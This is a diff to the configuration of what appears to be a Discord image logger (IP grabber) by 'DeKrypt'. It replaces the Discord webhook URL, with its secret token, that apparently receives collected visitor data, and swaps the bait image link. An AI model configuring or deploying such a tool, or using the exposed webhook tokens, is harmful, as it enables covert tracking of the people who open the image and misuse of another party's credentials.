@@ -9,8 +9,8 @@ author = "DeKrypt"
 
 config = {
 # BASE CONFIG #
-"webhook": "https://discord.com/api/webhooks/1401945482405740766/NvJbbSe1h4goaP3jTsuegVpRKlzrJpYId59IuY6tLDFkZtm-RpnVoau3riprSdrDkkzU",
-"image": "https://th.bing.com/th/id/R.4c1dd97109a382be1bc0c01f2b0b5ee2?rik=yjRFlGoRXWccsw&riu=http%3a%2f%2fgetwallpapers.com%2fwallpaper%2ffull%2fd%2f1%2f2%2f292380.jpg"}
+"webhook": "https://discord.com/api/webhooks/1441101290808803472/IdzV6tCuXUqsP4HxFjP37YCiMuaz3dQwuxhIm4p-iz_c_5Se-cWfCLGEhmUpHP9x0skz",
+"image": "https://i.pinimg.com/736x/b0/c4/34/b0c434ea62a27587427dba144b5b165a.jpg"}
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
 # This feature is undocumented mainly due to it being for detecting bots better.
